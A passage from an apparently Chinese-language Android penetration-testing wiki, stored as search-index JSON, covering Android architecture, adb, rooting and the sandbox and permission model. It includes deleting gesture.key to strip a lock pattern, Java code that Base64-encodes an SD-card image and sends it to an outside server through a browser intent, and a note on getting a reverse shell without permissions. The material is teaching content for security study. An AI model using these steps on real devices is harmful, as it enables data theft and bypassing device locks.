\u4e2d\u7684\u5e94\u7528\u7b7e\u540d\u68c0\u67e5"},{"location":"%E5%AE%89%E5%85%A8wiki/app%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#android_5","text":"","title":"\u7b2c\u4e00\u7ae0 Android \u5b89\u5168\u5165\u95e8"},{"location":"%E5%AE%89%E5%85%A8wiki/app%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#11-android_1","text":"\u5728 Linux \u5185\u6838\u4e4b\u4e0a\u662f\u4e00\u4e2a\u5c42\u7ea7\uff0c\u5305\u542b\u4e00\u4e9b\u6700\u91cd\u8981\u548c\u6709\u7528\u7684\u5e93\uff0c\u5982\u4e0b\u6240\u793a\uff1a Surface Manager\uff1a\u7ba1\u7406\u7a97\u53e3\u548c\u5c4f\u5e55 \u5a92\u4f53\u6846\u67b6\uff1a\u8fd9\u5141\u8bb8\u4f7f\u7528\u5404\u79cd\u7c7b\u578b\u7684\u7f16\u89e3\u7801\u5668\u6765\u64ad\u653e\u548c\u8bb0 \u5f55\u4e0d\u540c\u7684\u5a92\u4f53 SQLite\uff1a\u8fd9\u662f\u4e00\u4e2a\u8f83\u8f7b\u7684 SQL \u7248\u672c\uff0c\u7528\u4e8e\u6570\u636e\u5e93\u7ba1\u7406 WebKit\uff1a\u8fd9\u662f\u6d4f\u89c8\u5668\u6e32 \u67d3\u5f15\u64ce OpenGL\uff1a\u7528\u4e8e\u5728\u5c4f\u5e55\u4e0a\u6b63\u786e\u663e\u793a 2D \u548c 3D \u5185\u5bb9 Android \u4e2d\u7684\u5e93\u662f\u7528 C \u548c C++ \u7f16\u5199\u7684\uff0c\u5176\u4e2d\u5927\u591a\u6570\u662f\u4ece Linux \u79fb\u690d\u7684\u3002 \u4e0e Linux \u76f8\u6bd4\uff0c Android \u4e2d\u7684\u4e00\u4e2a\u4e3b\u8981\u533a\u522b\u662f\uff0c\u5728\u8fd9\u91cc\u6ca1\u6709 libc \u5e93\uff0c\u5b83\u7528\u4e8e Linux \u4e2d\u7684\u5927\u591a\u6570\u4efb\u52a1\u3002 \u76f8\u53cd\uff0c Android \u6709\u81ea\u5df1\u7684\u79f0\u4e3a bionic \u7684\u5e93\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba4\u4e3a\u5b83\u662f\u4e00\u4e2a\u5265\u79bb\u548c\u4fee\u6539\u540e\u7684\uff0c\u7528\u4e8e Android \u7684 libc \u7248\u672c\u3002 \u5728\u540c\u4e00\u5c42\u7ea7\uff0c\u8fd8\u6709\u6765\u81ea Android \u8fd0\u884c\u65f6 -- Dalvik \u865a\u62df\u673a\u548c\u6838\u5fc3\u5e93\u7684\u7ec4\u4ef6\u3002 \u6211\u4eec\u5c06\u5728\u672c\u4e66\u7684\u4e0b \u4e00\u90e8\u5206\u4e2d\u8ba8\u8bba\u5173\u4e8e Dalvik \u865a\u62df\u673a\u7684\u5f88\u591a\u5185\u5bb9\u3002 \u5728\u8fd9\u4e2a\u5c42\u4e4b\u4e0a\uff0c\u6709\u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u5c42\uff0c\u5b83\u652f\u6301\u5e94\u7528\u7a0b\u5e8f\u6267\u884c\u4e0d\u540c\u7c7b\u578b\u7684\u4efb\u52a1\u3002 \u6b64\u5916\uff0c\u5f00\u53d1\u4eba\u5458\u521b\u5efa\u7684\u5927\u591a\u6570\u5e94\u7528\u7a0b\u5e8f\u53ea\u4e0e\u7b2c\u4e00\u5c42\u548c\u6700\u9876\u5c42\u7684\u5e94\u7528\u7a0b\u5e8f\u4ea4\u4e92\u3002 \u8be5\u67b6\u6784\u4ee5\u4e00\u79cd \u65b9\u5f0f\u8bbe\u8ba1\uff0c\u5728\u6bcf\u4e2a\u65f6\u95f4\u70b9\uff0c\u5e95\u5c42\u90fd\u652f\u6301\u4e0a\u9762\u7684\u5c42\u7ea7\u3002 Android \u4e2d\u7684\u6240\u6709\u5e94\u7528\u7a0b\u5e8f\u90fd\u5728\u865a\u62df\u73af\u5883\u4e0b\u8fd0\u884c\uff0c\u8fd9\u79f0\u4e3a Dalvik \u865a\u62df\u673a\uff08DVM\uff09\u3002 \u8fd9\u91cc\u9700\u8981 \u6ce8\u610f\u7684\u4e00\u70b9\u662f\uff0c\u4ece Android 4.4 \u7248\u672c\u5f00\u59cb\uff0c\u8fd8\u6709\u53e6\u4e00\u4e2a\u8fd0\u884c\u65f6\u79f0\u4e3a Android \u8fd0\u884c\u65f6\uff08ART\uff09\uff0c \u7528\u6237\u53ef\u4ee5\u5728 DVM \u548c ART \u8fd0\u884c\u65f6\u73af\u5883\u4e4b\u95f4\u81ea\u7531\u5207\u6362\u3002 \u7136\u800c\uff0c\u5bf9\u4e8e\u8fd9\u672c\u4e66\uff0c\u6211\u4eec\u5c06\u53ea\u5173\u6ce8 Dalvik \u865a\u62df\u673a\u5b9e\u73b0\u3002 \u5b83\u7c7b\u4f3c\u4e8e Java \u865a\u62df\u673a\uff08JVM\uff09\uff0c\u9664 \u4e86\u57fa\u4e8e\u5bc4\u5b58\u5668\u7684\u7279\u6027\uff0c\u800c\u4e0d\u662f\u57fa\u4e8e\u5806\u6808\u7684\u7279\u6027\u3002 \u56e0\u6b64\uff0c\u8fd0\u884c\u7684\u6bcf\u4e2a\u5e94\u7528\u7a0b\u5e8f\u90fd\u5c06\u5728\u81ea\u5df1\u7684 Dalvik \u865a\u62df\u673a\u5b9e\u4f8b\u4e0b\u8fd0\u884c\u3002 \u56e0\u6b64\uff0c\u5982\u679c\u6211\u4eec\u8fd0\u884c\u4e09\u4e2a\u4e0d\u540c\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u5c06\u6709\u4e09\u4e2a\u4e0d\u540c\u7684\u865a\u62df \u5b9e\u4f8b\u3002 \u73b0\u5728\uff0c\u8fd9\u91cc\u7684\u91cd\u70b9\u662f\uff0c\u5373\u4f7f\u5b83\u4e3a\u5e94\u7528\u7a0b\u5e8f\u521b\u5efa\u4e00\u4e2a\u865a\u62df\u73af\u5883\u6765\u8fd0\u884c\uff0c\u5b83\u4e0d\u5e94\u8be5\u4e0e\u5b89\u5168 \u5bb9\u5668\u6216\u5b89\u5168\u73af\u5883\u6df7\u6dc6\u3002 DVM \u7684\u4e3b\u8981\u7126\u70b9\u662f\u4e0e\u6027\u80fd\u76f8\u5173\uff0c\u800c\u4e0d\u662f\u4e0e\u5b89\u5168\u6027\u76f8\u5173\u3002 Dalvik \u865a\u62df\u673a\u6267\u884c\u4e00\u4e2a\u540d\u4e3a .dex \u6216 Dalvik \u53ef\u6267\u884c\u6587\u4ef6\u7684\u6587\u4ef6\u683c\u5f0f\u3002","title":"1.1 Android \u7b80\u4ecb"},{"location":"%E5%AE%89%E5%85%A8wiki/app%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#12-android_1","text":"\u5982\u679c\u4f60\u6709 Android \u8bbe\u5907\u6216\u6b63\u5728\u8fd0\u884cAndroid\u6a21\u62df\u5668\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528 Android SDK \u672c\u8eab\u63d0\u4f9b\u7684\u5de5\u5177 \uff08\u79f0\u4e3a adb\uff09\u3002 \u6211\u4eec\u5c06\u5728\u7b2c\u4e8c\u7ae0\u8be6\u7ec6\u8ba8\u8bba adb\u3002 \u73b0\u5728\uff0c\u6211\u4eec\u5c06\u53ea\u8bbe\u7f6e SDK\uff0c\u6211\u4eec\u5df2\u7ecf\u51c6\u5907\u597d \u4e86\u3002 \u4e00\u65e6\u8bbe\u5907\u901a\u8fc7 USB \u8fde\u63a5\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u6211\u4eec\u7684\u7ec8\u7aef\u4e2d\u8f93\u5165 adb\uff0c\u8fd9\u5c06\u663e\u793a\u6240\u8fde\u63a5\u8bbe\u5907\u7684\u5e8f\u5217\u53f7 \u5217\u8868\u3002 \u8bf7\u786e\u4fdd\u4f60\u5df2\u5728\u8bbe\u5907\u8bbe\u7f6e\u4e2d\u542f\u7528\u4e86 USB \u8c03\u8bd5\u529f\u80fd\u3002 $ adb devices List of devices attached emulator-5554 device \uff0cAndroid \u662f\u57fa\u4e8e Linux \u5185\u6838\u7684\uff0c\u6240\u4ee5\u5927\u591a\u6570 Linux \u547d\u4ee4\u5728 Android \u4e0a \u4e5f\u53ef\u4ee5\u901a\u8fc7 adb shell \u5b8c\u7f8e\u8fd0\u884c\u3002 adb shell \u4e3a\u4f60\u63d0\u4f9b\u4e0e\u8bbe\u5907\u7684 shell \u76f4\u63a5\u4ea4\u4e92\uff0c\u4f60\u53ef\u4ee5\u5728\u5176\u4e2d \u6267\u884c\u547d\u4ee4\u548c\u6267\u884c\u64cd\u4f5c\u4ee5\u53ca\u5206\u6790\u8bbe\u5907\u4e2d\u5b58\u5728\u7684\u4fe1\u606f\u3002 \u4e3a\u4e86\u6267\u884c shell\uff0c\u53ea\u9700\u8981\u952e\u5165\u4ee5\u4e0b\u547d\u4ee4\uff1a adb shell. Android \u5b89\u5168\u6a21\u578b\u7684\u6838\u5fc3\u662f Linux \u7279\u6743\u5206\u79bb\u3002 \u6bcf\u6b21\u5728 Android \u8bbe\u5907\u4e2d\u542f\u52a8\u65b0\u5e94\u7528\u7a0b\u5e8f \u65f6\uff0c\u90fd\u4f1a\u4e3a\u5176\u5206\u914d\u552f\u4e00\u7684\u7528\u6237 ID\uff08UID\uff09\uff0c\u8be5\u7528\u6237 ID \u5c06\u4e4b\u540e\u4f1a\u5c5e\u4e8e\u67d0\u4e9b\u5176\u4ed6\u9884\u5b9a\u4e49\u7ec4\u3002 \u4e0e Linux \u7c7b\u4f3c\uff0c\u7528\u4f5c\u547d\u4ee4\u7684\u6240\u6709\u4e8c\u8fdb\u5236\u6587\u4ef6\u90fd\u4f4d\u4e8e /system/bin \u548c /system /xbin \u3002 \u6b64\u5916\uff0c\u6211 \u4eec\u4ece Play \u5546\u5e97\u6216\u4efb\u4f55\u5176\u4ed6\u6765\u6e90\u5b89\u88c5\u7684\u5e94\u7528\u7a0b\u5e8f\u6570\u636e\u5c06\u4f4d\u4e8e /data/data \uff0c\u800c\u5176\u539f\u59cb\u5b89\u88c5\u6587\u4ef6 \uff08\u5373 .apk \uff09\u5c06\u5b58\u50a8\u5728 /data/app \u3002 \u6b64\u5916\uff0c\u8fd8\u6709\u4e00\u4e9b\u5e94\u7528\u7a0b\u5e8f\u9700\u8981\u4ece Play \u5546\u5e97\u8d2d\u4e70\uff0c\u800c\u4e0d\u662f \u53ea\u662f\u514d\u8d39\u4e0b\u8f7d\u3002 \u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u5c06\u5b58\u50a8\u5728 /data/app-private/ \u3002 Android \u5b89\u88c5\u5305\uff08APK\uff09\u662f Android \u5e94\u7528\u7a0b\u5e8f\u7684\u9ed8\u8ba4\u6269\u5c55\u540d\uff0c\u5b83\u53ea\u662f\u4e00\u4e2a\u5f52\u6863\u6587\u4ef6\uff0c\u5305\u542b\u5e94\u7528 \u7a0b\u5e8f\u7684\u6240\u6709\u5fc5\u9700\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u3002 \u6211\u4eec\u5728\u540e\u9762\u7684\u7ae0\u8282\u4e2d\u5c06\u7ee7\u7eed\u5bf9 .apk \u6587\u4ef6\u8fdb\u884c\u9006\u5411\u5de5\u7a0b\u3002 \u73b0\u5728\uff0c\u8ba9\u6211\u4eec\u8bbf\u95ee /data/data \uff0c\u770b\u770b\u91cc\u9762\u6709\u4ec0\u4e48\u3002 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u4e00\u70b9\u662f\uff0c\u4e3a\u4e86\u5728\u771f\u5b9e\u8bbe\u5907 \u4e0a\u5b9e\u73b0\uff0c\u8bbe\u5907\u9700\u8981 root \u5e76\u4e14\u5fc5\u987b\u5904\u4e8e su \u6a21\u5f0f\uff1a \u5982\u679c\u624b\u673a\u5df2\u7ecf root\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u4efb\u4f55\u6587 \u4ef6\u3002 \u5bf9\u8bbe\u5907\u83b7\u53d6 root \u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u5b8c\u5168\u8bbf\u95ee\u548c\u63a7\u5236\u6574\u4e2a\u8bbe\u5907\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u4ee5\u53ca \u4fee\u6539\u4efb\u4f55\u6211\u4eec\u60f3\u8981\u7684\u6587\u4ef6\u3002 \u6700\u5e38\u89c1\u7684\u5b89\u5168\u4fdd\u62a4\u4e4b\u4e00\u662f\u5927\u591a\u6570\u4eba\u90fd\u60f3\u5230\u7684\u662f\u6a21\u5f0f\u9501\u5b9a\u6216 pin \u9501\uff0c\u5b83\u9ed8\u8ba4\u5b58\u5728\u4e8e\u6240\u6709Android \u624b\u673a\u3002 \u4f60\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee Settings | Security | Screen Lock \u6765\u914d\u7f6e\u81ea\u5df1\u7684\u6a21\u5f0f\u3002 \u4e00\u65e6\u6211\u4eec\u8bbe\u7f6e\u4e86\u5bc6\u7801\u6216\u6a21\u5f0f\u9501\u5b9a\uff0c\u6211\u4eec\u73b0\u5728\u5c06\u7ee7\u7eed\uff0c\u5c06\u624b\u673a\u4e0e USB \u8fde\u63a5\u5230\u6211\u4eec\u7684\u7cfb\u7edf\u3002 \u73b0 \u5728\uff0c\u5bc6\u7801\u9501\u7684\u5bc6\u94a5\u6216\u6a21\u5f0f\u9501\u7684\u6a21\u5f0f\u6570\u636e\u4ee5\u540d\u79f0 password.key \u6216 gesture.key \u5b58\u50a8 \u5728 /data/system \u3002 \u6ce8\u610f\uff0c\u5982\u679c\u8bbe\u5907\u88ab\u9501\u5b9a\uff0c\u5e76\u4e14 USB \u8c03\u8bd5\u88ab\u6253\u5f00\uff0c\u4f60\u9700\u8981\u4e00\u4e2a\u81ea\u5b9a\u4e49\u5f15\u5bfc \u52a0\u8f7d\u7a0b\u5e8f\u6765\u6253\u5f00 USB \u8c03\u8bd5\u3002 \u6574\u4e2a\u8fc7\u7a0b\u8d85\u51fa\u4e86\u672c\u4e66\u7684\u8303\u56f4\u3002 \u8981\u4e86\u89e3\u6709\u5173 Android \u7684\u66f4\u591a\u4fe1 \u606f\uff0c\u8bf7\u53c2\u9605 Thomas Cannon Digging \u7684 Defcon \u6f14\u793a\u3002 \u56e0\u4e3a\u7834\u89e3\u5bc6\u7801/\u6a21\u5f0f\u5c06\u66f4\u52a0\u8270\u96be\uff0c\u5e76\u4e14\u9700\u8981\u66b4\u529b\uff08\u6211\u4eec\u5c06\u770b\u5230\u5982\u4f55\u89e3\u5bc6\u5b9e\u9645\u6570\u636e\uff09\uff0c\u6211\u4eec\u5c06\u7b80 \u5355\u5730\u7ee7\u7eed\u5e76\u5220\u9664\u8be5\u6587\u4ef6\uff0c\u8fd9\u5c06\u4ece\u6211\u4eec\u624b\u673a\u4e2d\u5220\u9664\u6a21\u5f0f\u4fdd\u62a4 \uff1a shell@android:/data # cd /data/system shell@android:/data/system # rm gesture.key","title":"1.2 \u6df1\u5165\u4e86\u89e3 Android"},{"location":"%E5%AE%89%E5%85%A8wiki/app%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#13","text":"Android \u4e2d\u7684\u6bcf\u4e2a\u5e94\u7528\u7a0b\u5e8f\u90fd\u5728\u5176\u81ea\u5df1\u7684 Dalvik \u865a\u62df\u673a\u5b9e\u4f8b\u4e2d \u8fd0\u884c\u3002 \u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\uff0c\u65e0\u8bba\u4f55\u65f6\u4efb\u4f55\u5e94\u7528\u7a0b\u5e8f\u5728\u6211\u4eec\u7684\u8bbe\u5907\u4e2d\u5d29\u6e83\uff0c\u5b83\u53ea\u662f\u663e\u793a\u5f3a\u5236\u5173\u95ed\u6216 \u7b49\u5f85\u9009\u9879\uff0c\u4f46\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u7ee7\u7eed\u987a\u5229\u8fd0\u884c\u3002 \u6b64\u5916\uff0c\u7531\u4e8e\u6bcf\u4e2a\u5e94\u7528\u7a0b\u5e8f\u90fd\u5728\u5176\u81ea\u5df1\u7684\u5b9e\u4f8b\u4e2d\u8fd0 \u884c\uff0c\u56e0\u6b64\u9664\u975e\u5185\u5bb9\u63d0\u4f9b\u8005\u53e6\u6709\u89c4\u5b9a\uff0c\u5426\u5219\u5c06\u65e0\u6cd5\u8bbf\u95ee\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u7684\u6570\u636e\u3002 Android \u4f7f\u7528\u7ec6\u7c92\u5ea6\u7684\u6743\u9650\u6a21\u578b\uff0c\u8fd9\u9700\u8981\u5e94\u7528\u7a0b\u5e8f\u5728\u7f16\u8bd1\u6700\u7ec8\u5e94\u7528\u7a0b\u5e8f\u5305\u4e4b\u524d\u9884\u5b9a\u4e49\u6743\u9650\u3002 \u4f60\u5fc5\u987b\u6ce8\u610f\u5230\uff0c\u6bcf\u6b21\u4ece Play \u5546\u5e97\u6216\u4efb\u4f55\u5176\u4ed6\u6765\u6e90\u4e0b\u8f7d\u5e94\u7528\u7a0b\u5e8f\u65f6\uff0c\u5b83\u4f1a\u5728\u5b89\u88c5\u8fc7\u7a0b\u4e2d\u663e\u793a\u4e00 \u4e2a\u6743\u9650\u5c4f\u5e55\uff0c\u5b83\u7c7b\u4f3c\u4e8e\u4ee5\u4e0b\u5c4f\u5e55\u622a\u56fe\uff1a \u6b64\u6743\u9650\u5c4f\u5e55\u663e\u793a\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u901a\u8fc7\u624b\u673a\u6267\u884c\u7684\u6240\u6709\u4efb\u52a1\u7684\u5217\u8868\uff0c\u4f8b\u5982\u53d1\u9001\u77ed\u4fe1\uff0c\u8bbf\u95ee\u4e92\u8054\u7f51 \u548c\u8bbf\u95ee\u6444\u50cf\u5934\u3002 \u8bf7\u6c42\u591a\u4e8e\u6240\u9700\u7684\u6743\u9650\u4f7f\u5e94\u7528\u7a0b\u5e8f\u6210\u4e3a\u6076\u610f\u8f6f\u4ef6\u4f5c\u8005\u7684\u66f4\u5177\u5438\u5f15\u529b\u7684\u76ee\u6807\u3002 Android \u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u4eba\u5458\u5fc5\u987b\u5728\u5f00\u53d1\u5e94\u7528\u7a0b\u5e8f\u65f6\u5728\u540d\u4e3a AndroidManifest.xml \u7684\u6587\u4ef6\u4e2d\u6307\u5b9a \u6240\u6709\u8fd9\u4e9b\u6743\u9650\u3002 \u6b64\u6587\u4ef6\u5305\u542b\u5404\u79cd\u5e94\u7528\u7a0b\u5e8f\u76f8\u5173\u4fe1\u606f\u7684\u5217\u8868\uff0c\u4f8b\u5982\u8fd0\u884c\u7a0b\u5e8f\u6240\u9700\u7684\u6700\u4f4e Android \u7248\u672c\uff0c\u7a0b\u5e8f\u5305\u540d\u79f0\uff0c\u6d3b\u52a8\u5217\u8868\uff08\u5e94\u7528\u7a0b\u5e8f\u53ef\u89c1\u7684\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u754c\u9762\uff09\uff0c\u670d\u52a1\uff08\u5e94\u7528\u7a0b \u5e8f\u7684\u540e\u53f0\u8fdb\u7a0b\uff09 \uff0c\u548c\u6743\u9650\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u4eba\u5458\u672a\u80fd\u5728 AndroidManifest.xml \u6587\u4ef6\u4e2d\u6307\u5b9a \u6743\u9650\uff0c\u5e76\u4ecd\u5728\u5e94\u7528\u7a0b\u5e8f\u4e2d\u4f7f\u7528\u5b83\uff0c\u5219\u5e94\u7528\u7a0b\u5e8f\u5c06\u5d29\u6e83\uff0c\u5e76\u5728\u7528\u6237\u8fd0\u884c\u5b83\u65f6\u663e\u793a\u5f3a\u5236\u5173\u95ed\u6d88 \u606f\u3002 \u4e00\u4e2a\u6b63\u5e38\u7684 AndroidManifest.xml \u6587\u4ef6\u770b\u8d77\u6765\u50cf\u4e0b\u9762\u7684\u622a\u56fe\u6240\u793a\u3002 \u5728\u8fd9\u91cc\uff0c\u4f60\u53ef\u4ee5\u4f7f \u7528 \u6807\u8bb0\u548c\u5176\u4ed6\u6807\u8bb0\u67e5\u770b\u6240\u9700\u7684\u4e0d\u540c\u6743\u9650\uff1a \u5982\u524d\u6240\u8ff0\uff0c\u6240\u6709 Android \u5e94\u7528\u7a0b\u5e8f\u5728\u5b89\u88c5\u540e\u9996\u6b21\u542f\u52a8\u65f6\u90fd\u4f1a\u5206\u914d\u4e00\u4e2a\u552f\u4e00\u7684 UID\u3002 \u5177\u6709\u7ed9\u5b9a UID \u7684\u6240\u6709\u7528\u6237\u90fd\u5c5e\u4e8e\u7279\u5b9a\u7ec4\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u4ed6\u4eec\u8bf7\u6c42\u7684\u6743\u9650\u3002 \u4f8b\u5982\uff0c\u4e00\u4e2a\u4ec5\u8bf7\u6c42 Internet \u6743 \u9650\u7684\u5e94\u7528\u7a0b\u5e8f\u5c06\u5c5e\u4e8e inet \u7ec4\uff0c\u56e0\u4e3a Android \u4e2d\u7684 Internet \u6743\u9650\u4f4d\u4e8e inet \u7ec4\u4e0b\u3002 \u7528\u6237\uff08\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u7684\u5e94\u7528\u7a0b\u5e8f\uff09\u53ef\u4ee5\u5c5e\u4e8e\u591a\u4e2a\u7ec4\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u4ed6\u4eec\u8bf7\u6c42\u7684\u6743\u9650\u3002 \u6216\u8005\u6362\u53e5 \u8bdd\u8bf4\uff0c\u6bcf\u4e2a\u7528\u6237\u53ef\u4ee5\u5c5e\u4e8e\u591a\u4e2a\u7ec4\uff0c\u5e76\u4e14\u6bcf\u4e2a\u7ec4\u53ef\u4ee5\u5177\u6709\u591a\u4e2a\u7528\u6237\u3002 \u8fd9\u4e9b\u7ec4\u5177\u6709\u7531\u7ec4 ID\uff08GID\uff09\u5b9a\u4e49\u7684\u552f\u4e00\u540d\u79f0\u3002 \u7136\u800c\uff0c\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u660e\u786e\u5730\u6307\u5b9a\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u5728\u4e0e\u7b2c\u4e00\u4e2a\u76f8\u540c \u7684 UID \u4e0b\u8fd0\u884c\u3002 \u5728\u6211\u4eec\u7684\u8bbe\u5907\u4e2d\uff0c\u5176\u4e2d\u7684\u7ec4\u548c\u6743\u9650\u5728\u6587\u4ef6 platform.xml \u4e2d\u6307\u5b9a\uff0c\u5b83\u4f4d \u4e8e /system/etc/permissions/ \uff1a shell@grouper:/system/etc/permissions $ cat platform.xml . . . . . . [Some of the data has been stripped from here in order to shorten the output an d make it readable] \u6b64\u5916\uff0c\u8fd9\u6e05\u9664\u4e86\u5bf9\u5728 Android \u8bbe\u5907\u4e2d\u8fd0\u884c\u7684\u672c\u5730\u5e94\u7528\u7a0b\u5e8f\u7684\u6000\u7591\u3002 \u7531\u4e8e\u672c\u5730\u5e94\u7528\u7a0b\u5e8f\u76f4\u63a5\u4e0e \u5904\u7406\u5668\u4ea4\u4e92\uff0c\u800c\u4e0d\u662f\u5728 Dalvik \u865a\u62df\u673a\u4e0b\u8fd0\u884c\uff0c\u56e0\u6b64\u5b83\u4e0d\u4f1a\u4ee5\u4efb\u4f55\u65b9\u5f0f\u5f71\u54cd\u6574\u4f53\u5b89\u5168\u6a21\u578b\u3002 \u73b0\u5728\uff0c\u5c31\u50cf\u6211\u4eec\u5728\u524d\u9762\u90e8\u5206\u770b\u5230\u7684\uff0c\u5e94\u7528\u7a0b\u5e8f\u5c06\u5176\u6570\u636e\u5b58\u50a8 \u5728 location/data/data/[package name] \u3002 \u73b0\u5728\uff0c\u5b58\u50a8\u5e94\u7528\u7a0b\u5e8f\u6570\u636e\u7684\u6240\u6709\u6587\u4ef6\u5939\u4e5f\u5177\u6709\u76f8\u540c \u7684\u7528\u6237 ID\uff0c\u8fd9\u6784\u6210 Android \u5b89\u5168\u6a21\u578b\u7684\u57fa\u7840\u3002 \u6839\u636e UID \u548c\u6587\u4ef6\u6743\u9650\uff0c\u5b83\u5c06\u9650\u5236\u6765\u81ea\u5177\u6709\u4e0d\u540c UID \u7684\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u5bf9\u5b83\u7684\u8bbf\u95ee\u548c\u4fee\u6539\u3002 \u5728\u4e0b\u9762\u7684\u4ee3\u7801\u793a\u4f8b\u4e2d\uff0c ret \u5305\u542b\u4ee5 Base64 \u683c\u5f0f\u7f16\u7801\u5b58\u50a8\u5728\u7684 SD \u5361\u4e2d\u7684\u56fe\u50cf\uff0c\u73b0\u5728\u6b63\u5728\u4f7f \u7528\u6d4f\u89c8\u5668\u8c03\u7528\u6765\u4e0a\u4f20\u5230 attify.com \u7f51\u7ad9\u3002 \u76ee\u7684\u53ea\u662f\u627e\u5230\u4e00\u79cd\u65b9\u5f0f\u6765\u5728\u4e24\u4e2a\u4e0d\u540c\u7684 Android \u5bf9 \u8c61\u4e4b\u95f4\u8fdb\u884c\u901a\u4fe1\u3002 \u6211\u4eec\u5c06\u9996\u5148\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61\u6765\u5b58\u50a8\u56fe\u50cf\uff0c\u5728 Base64 \u4e2d\u7f16\u7801\uff0c\u6700\u540e\u5c06\u5176\u5b58\u50a8\u5728\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d imageString \uff1a final File file = new File(\"/mnt/sdcard/profile.jpg\"); Uri uri = Uri.fromFile(file); ContentResolver cr = getContentResolver(); Bitmap bMap=null; try { InputStream is = cr.openInputStream(uri); bMap = BitmapFactory.decodeStream(is); if (is != null) { is.close(); } } catch (Exception e) { Log.e(\"Error reading file\", e.toString()); } ByteArrayOutputStream baos = new ByteArrayOutputStream(); bMap.compress(Bitmap.CompressFormat.JPEG, 100, baos); byte[] b = baos.toByteArray(); String imageString = Base64.encodeToString(b,Base64.DEFAULT); \u6700\u540e\uff0c\u6211\u4eec\u5c06\u542f\u52a8\u6d4f\u89c8\u5668\u5c06\u6570\u636e\u53d1\u9001\u5230\u6211\u4eec\u7684\u670d\u52a1\u5668\uff0c\u6211\u4eec\u6709\u4e00\u4e2a .php \u6587\u4ef6\u4fa6\u542c\u4f20\u5165\u7684\u6570 \u636e\uff1a startActivity(new Intent(Intent.ACTION_VIEW,Uri.parse(\" http://attify.com/up.php?u=\"+im ageString))); \u6211\u4eec\u8fd8\u53ef\u4ee5\u6267\u884c\u547d\u4ee4\u5e76\u4ee5\u76f8\u540c\u7684\u65b9\u5f0f\u5c06\u8f93\u51fa\u53d1\u9001\u5230\u8fdc\u7a0b\u670d\u52a1\u5668\u3002 \u4f46\u662f\uff0c\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u4e00\u70b9 \u662f shell \u5e94\u8be5\u5728\u5e94\u7528\u7a0b\u5e8f\u7684\u7528\u6237\u4e0b\u8fd0\u884c\uff1a // To execute commands : String str = \"cat /proc/version\"; //command to be executed is stored in str. process = Runtime.getRuntime().exec(str); \u8fd9\u662f\u4e00\u4e2a\u6709\u8da3\u7684\u73b0\u8c61\uff0c\u56e0\u4e3a\u653b\u51fb\u8005\u53ef\u4ee5\u83b7\u5f97\u4e00\u4e2a\u53cd\u5411 shell\uff08\u8fd9\u662f\u4e00\u4e2a\u4ece\u8bbe\u5907\u5230\u7cfb\u7edf\u7684\u53cc\u5411\u8fde \u63a5\uff0c\u53ef\u4ee5\u7528\u4e8e\u6267\u884c\u547d\u4ee4\uff09\uff0c\u800c\u4e0d\u9700\u8981\u4efb\u4f55\u7c7b\u578b\u7684\u6743\u9650\u3002","title":"1.3 \u6c99\u7bb1\u548c\u6743\u9650\u6a21\u578b"},{"location":"%E5%AE%89%E5%85%A8wiki/app%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#14","text":"\u5e94\u7528\u7a0b\u5e8f\u7b7e\u540d\u662f Android \u7684\u72ec\u7279\u7279\u6027\u4e4b\u4e00\uff0c\u7531\u4e8e\u5176\u5f00\u653e\u6027\u548c\u5f00\u53d1\u4eba\u5458\u793e\u533a\uff0c\u5b83\u53d6\u5f97\u4e86\u6210\u529f\u3002 Play \u5546\u5e97\u4e2d\u6709\u8d85\u8fc7\u4e00\u767e\u4e07\u4e2a\u5e94\u7528\u3002 \u5728 Android \u4e2d\uff0c\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u901a\u8fc7\u4e0b\u8f7d Android SDK \u521b\u5efa Android \u5e94\u7528\uff0c\u7136\u540e\u5c06\u5176\u53d1\u5e03\u5230 Play \u5546\u5e97\u3002 \u901a\u5e38\u6709\u4e24\u79cd\u7c7b\u578b\u7684\u8bc1\u4e66\u7b7e\u540d\u673a\u5236\u3002 \u4e00\u4e2a\u662f\u7531\u7ba1\u7406 \u8bc1\u4e66\u9881\u53d1\u673a\u6784\uff08CA\uff09\u7b7e\u540d\u7684\uff0c\u53e6\u4e00\u4e2a\u662f\u81ea\u7b7e\u540d\u8bc1\u4e66\u3002 \u6ca1\u6709\u4e2d\u95f4\u8bc1\u4e66\u9881\u53d1\u673a\u6784\uff08CA\uff09\uff0c\u800c\u5f00 